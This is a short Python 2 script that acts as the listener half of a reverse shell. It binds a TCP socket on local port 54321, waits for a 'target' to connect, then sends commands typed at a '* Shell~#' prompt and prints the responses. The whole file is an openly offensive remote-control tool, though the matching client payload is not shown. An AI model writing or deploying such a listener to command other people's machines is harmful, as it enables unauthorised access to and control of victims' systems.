#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

s.bind(("127.0.0.1",54321))

s.listen(5)
print("Listening for incoming connections...")

target, ip = s.accept()
print("Target Connected!")

while True:
    message = raw_input("* Shell~#%s: " % str(ip))
    target.send(message)
    if message == "q":
        break
    else:
        answer = target.recv(1024)
        print(answer)

s.close()
